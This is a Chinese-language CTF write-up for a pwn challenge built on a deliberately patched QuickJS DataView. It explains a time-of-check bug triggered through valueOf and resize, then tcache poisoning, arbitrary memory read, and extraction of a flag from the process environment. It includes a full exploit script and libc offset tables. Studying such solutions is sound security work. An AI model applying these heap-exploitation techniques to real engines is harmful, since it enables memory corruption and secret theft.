# QwirlBox — Hardened JavaScript Evaluation Relay

```
> TPCTF 2026 · pwn · 挑战 ID `AUTHORED-B4D3046D` · 状态 solved
```

## 一句话

QwirlBox is the platform team's hardened JavaScript evaluation service: a pinned QuickJS 2026-06-04 engine behind a strict TCP relay.

## 附件

| 文件 | 大小 | sha256 |
| --- | --- | --- |
| `src/quickjs-base-bundle.tar.gz` | 1.5 MB | `a69e0f7f77c5…` |
| `src/patch.diff` | 3.5 KB | `878f12db230e…` |

## 分析与利用

FLAG：«FLAG»

分值：动态计分

### 0. 结果

«FLAG»

远程实例：172.16.202.2:8000（题面 host {{INSTANCE_HOST}}，新 VPN 段 172.16.202.0/24）。三次独立连接均返回同一 flag，exp 可复现。

### 1. 题目与补丁

服务端是 QuickJS 2026-06-04 加一个公开 patch（patch 6），每行 JSON 执行一次：

```
{"code":"<JS source>"}
```

runtime 在一条 TCP 连接内持久，脚本看不到文件/进程/环境/模块/网络，但 worker 进程内存里有实例 secret（QJS_CTF_FLAG，由 adapter 注入 worker env，JS 侧不可见）。

patch 6 只改 js_dataview_getValue / js_dataview_setValue（third_party/quickjs/src/quickjs.c）：把几何读取提前到任何用户回调之前。

```
/* patched */
abuf = ta->buffer->u.array_buffer;
view_length = ta->length;
```

byte_length = abuf->byte_length;   // 快照

JS_ToIndex(ctx, &pos, argv[0]);    // 可执行 valueOf

...

```
if (abuf->detached) throw ...;
if ((pos + size) > view_length) throw RangeError;
if ((int64_t)ta->offset + view_length > byte_length) throw TypeError;
```

ptr = abuf->data + ta->offset + pos;   // 用“新” data，配合旧长度

上游代码是在 JS_ToIndex 之后才读取 ta->length / abuf->byte_length，所以 patch 把“转换后校验”变成了“转换前快照校验”。在 valueOf 里对 resizable ArrayBuffer 调 ab.resize(0x100)，长度检查仍按 0x10000 通过，而 ptr 用的是缩小后的 data 指针，于是得到一次越界访问。

关键点：abuf->detached 是转换后重新读的，所以不能用 transfer；data 也是重新读的，所以缩小后 ptr = 新 data + offset + pos 指向 tail。

### 2. 原语

• 每次 resize(small) 后，越界窗口最多到原 allocation 的末尾（data+L 至多落在后一个 chunk 的 prev_size，碰不到后一个 chunk 的 size）。
• 一次 get/set 只做 1/2/4/8 字节一次访问。
• 但外层 set 的 index/value 转换里可以再调一个 DataView，形成嵌套：
• 外层 set 在第 4 行快照 (L, L)；
• idx.valueOf 调 dv.getBigUint64(...)，内层也在 buffer 还满时快照 (L, L)；
• 内层 pos.valueOf 里 resize(0x100)，内层 get 越界读 tail；
• 内层返回后，外层仍用 (L, L) 快照，可以再写同一个 tail。

因此一次外层调用 = 同一 tail 内“读一次 + 写一次”，足以做 tcache 投毒。

### 3. 堆布局（glibc 2.36 / Debian 12）

QuickJS 对大于 512 字节的 ArrayBuffer 走 js_malloc_large：host malloc(8+len)，返回 host+8，所以 JS data = glibc chunk + 0x18。

取 ab = new ArrayBuffer(0x10000)：

• glibc chunk size 0x10010，data = A+0x18；
• ab.resize(0x100) 后原 chunk 缩为 0x110，剩余 tail B = A+0x110，size 0xFF00，进 unsorted bin；
• tail 的 glibc user 指针 q = B+0x10 = data+0x108：
• data+0x108 = unsorted fd（libc main_arena 指针）；
• data+0x110 = bk。

同时 QuickJS 自己还有 4KB arena 的小分配器（class 16..512，8 字节头）。JSTypedArray(48) 落 class 56，JSArrayBuffer(56) 落 class 64，JSObject(64) 落 class 72。

### 4. 利用链

1. 建 ab、dv = DataView(ab,0,0x10000)、gbig = new ArrayBuffer(0x10000)（让 tail 不直接并进 top）、预分配 8 个 ArrayBuffer(0x208) 把 0x220 tcache bin 占住。
2. p4.valueOf 里 resize(0x100)，读 data+0x108 得到 libc 指针 fd。
3. p3.valueOf 在 shrink 之后（仍在 OOB 窗口里）分配 s0,s1,s2 = new ArrayBuffer(0x208)；s0 落在 tail 最前（chunk e0），s1 紧随其后（chunk e1）。先 s1.transfer(0) 把 e1 放回 tcache（此时 e1->next=NULL），读 data+0x328（e1 的 user word）得到 leak = e1 >> 12。
4. idx.valueOf 里 s0.transfer(0) 释放 e0，tcache 头变成 e0、e0->next=e1；返回 0x108。外层 val.valueOf 计算

e2 = (leak << 12n) | 0x670n;   // e1 的 chunk 地址（代码里叫 e2）

T  = e2 - 0x10A0n;             // 目标 chunk（16 对齐），T+8 = abuf-8

encoded = leak ^ T;            // e0->next 的 safe-linked 编码

因为 e0 和 e1 在同一 4KB 页内（只差 0x220），e0>>12 == e1>>12，用 leak 当 e0 的 key 即可。外层 setBigUint64 把 encoded 写进 data+0x108，即 e0 的 user word（e0->next）。

5. pa = new ArrayBuffer(0x208) 弹出 e0；pb = new ArrayBuffer(0x208) 弹出 T。pb 的 JS data = T+8 = abuf-8（abuf 是 ab 的 JSArrayBuffer 结构体）。
6. 用 vd = DataView(pb) 重写 abuf：
• offset 8：byte_length = 0x10000
• offset 12：max_byte_length = 0x10000
• offset 16/17：detached = 0 / shared = 0
• offset 24（abuf+0x10）：data 指针
7. 原 dv 恢复有效，rd(addr) = 改 abuf->data 为 addr，再 dv.getBigUint64(0)，得到任意读。
8. 读 __environ（fd + 0x7660），拿到 envp 数组；逐项读指针，再逐字节读字符串，匹配 QJS_CTF_FLAG=，输出 flag。

js_mallocz 在分配 pb 的 data 时会把 abuf-8..abuf+… 清零，所以第 6 步的重写必须在分配之后做（exp 里就是 vd 建好后再写入）。

### 5. 偏移表

| 环境 | unsorted fd | __environ | fd→environ | LOW | T = e2 - offset |
| --- | --- | --- | --- | --- | --- |
| 本地 Ubuntu 22.04 glibc 2.35 | libc+0x21ace0 | libc+0x222200 | 0x7520 | 0x890 | 0x12C0 |
| Ubuntu 24.04 glibc 2.39-0ubuntu8.12 | libc+0x204b20 | libc+0x20bd58 | 0x7238 | 0x670 | 0x10A0 |
| 远程 Debian 12 glibc 2.36 | libc+0x1d3cc0 | libc+0x1db320 | 0x7660 | 0x670 | 0x10A0 |

其中 e2 是 s1 的 chunk 地址；实测 e2 - abuf 在 2.39/2.36 下是 0x1090（所以 T = e2 - 0x10A0 = abuf - 0x10），2.35 下是 0x12B0。

远程识别过程：简单探针读 tail fd 得到 0x76bde2eeccc0，low12 = 0xcc0；Ubuntu 2.35 是 0xce0，Ubuntu 2.39/2.41 是 0xb20，Debian 12 的 libc6 2.36-9+deb12u14 正好是 0xcc0。随后在本地用 Debian 2.36 的 ld/libc 跑 patched runner，gdb 测得 fd 偏移 0x1d3cc0、environ 偏移 0x1db320，且该 libc 下 abuf 与 e2 的差仍是 0x1090，于是 LOW=0x670。

### 6. 远程复现

# 新 VPN：172.16.202.0/24，目标 172.16.202.2:8000

wsl -d Ubuntu-22.04 -e bash -lc "cd /mnt/d/work/jsbox6 && python3 remote_run.py final_deb.js 172.16.202.2 8000"

输出：

```
{"ok":true,"result":{"fd":"796b705fbcc0","leak":"5c939655b","envp":"7ffe02069e68","out":"QJS_CTF_FLAG=«FLAG»"}}
```

本地 Debian 2.36 验证（同一份 exp，换成本地 flag 文件/环境变量）：

wsl -d Ubuntu-22.04 -e bash -lc "cd /mnt/d/work/jsbox6 && QJS_CTF_FLAG=«FLAG» python3 run_deb.py final_deb.js ./qjs_deb"

# {"fd":"7cb0c5620cc0",...,"out":"QJS_CTF_FLAG=«FLAG»"}

### 7. 完整 exp（final_deb.js）

```js
var keepAB = new ArrayBuffer(16);
var dv0 = new DataView(keepAB, 0, 8);
var ab = new ArrayBuffer(0x10000, {maxByteLength: 0x10000});
var dv = new DataView(ab, 0, 0x10000);
var gbig = new ArrayBuffer(0x10000);
dv0 = null;
var drain = new Array(8);
for (var i = 0; i < 8; i++) drain[i] = new ArrayBuffer(0x208);
var fd = 0n;
var p4 = { valueOf: function(){ ab.resize(0x100); return 0x108; } };
var s1 = null, s2 = null;
var p3 = { valueOf: function(){ fd = dv.getBigUint64(p4, true); s0 = new ArrayBuffer(0x208); s1 = new ArrayBuffer(0x208); s2 = new ArrayBuffer(0x208); s1.transfer(0); return 0x328; } };
var leak = 0n;
var idx = { valueOf: function(){ leak = dv.getBigUint64(p3, true); s0.transfer(0); return 0x108; } };
var val = { valueOf: function(){ var e2 = (leak << 12n) | 0x670n; var T = e2 - 0x10A0n; return (leak - 0n) ^ T; } };
dv.setBigUint64(idx, val, true);
var pa = new ArrayBuffer(0x208);
var pb = new ArrayBuffer(0x208);
var vd = new DataView(pb);
var rd = function(a){ vd.setBigUint64(24, a, true); return dv.getBigUint64(0, true); };
var rdb = function(a){ vd.setBigUint64(24, a, true); return dv.getUint8(0, true); };
var rdc = function(a, max){ var s = ''; for (var i = 0; i < max; i++){ var b = rdb(a + BigInt(i)); if (b === 0) break; s += String.fromCharCode(b); } return s; };
vd.setUint32(8, 0x10000, true);
vd.setUint32(12, 0x10000, true);
vd.setUint8(16, 0);
vd.setUint8(17, 0);
var envp = rd(fd + 0x7660n);
var out = '';
for (var i = 0; i < 200; i++){
var p = rd(envp + BigInt(i) * 8n);
if (p == 0n) break;
var s = rdc(p, 256);
if (s.indexOf('QJS_CTF_FLAG=') === 0){ out = s; break; }
}
```

({fd: fd.toString(16), leak: leak.toString(16), envp: envp.toString(16), out: out})

### 8. 为什么不是别的路线

• 直接把 tail 的 size 改大做 exact-fit：glibc 会检查 unsorted victim 的 next chunk size，malloc(): invalid next size (unsorted)。
• 把新 arena 放进 tail：class-64 free list 的状态依赖源长度和第二次 eval 的分配序列，实测不稳定（大量 S 扫描都不落尾块）。
• tcache 路线只依赖 e2 与 abuf 的相对差（同一静态脚本内固定），再用 8 字节 OOB 写一次链头即可，确定性最好。

### 9. 关键文件

• D:/work/jsbox6/final_deb.js — 远程/本地 Debian 2.36 用 exp（本文第 7 节）
• D:/work/jsbox6/qjs_deb — patchelf 到 Debian 2.36 ld/libc 的 patched runner
• D:/work/jsbox6/run_deb.py / remote_run.py — 本地/远程发送器
• D:/work/jsbox6/gdb_deb_final2.sh — 测 abuf/e2 布局
• D:/work/jsbox6/resume.md — 过程恢复点

## 结果

- flag sha256：`707a6ce553e22b4b7fab5492c755b481161ae28097a3701bd6646e22987a1c1b`, `80c2c5c5b604ade34a67cc82c374dba2d0731cf7c4bd7b236b79d7cedfbb3639`
- 明文 flag 不入库；提交记录见 `.ctf-submissions.jsonl` 或原始 WP。

## 脚本

- （未归档脚本，见原始工作目录）

## 待核实

- 本条目由 WP 第 35 节《QwirlBox — Hardened JavaScript Evaluation Relay》与平台附件自动合成，建议人工复核 summary 与 fingerprints。
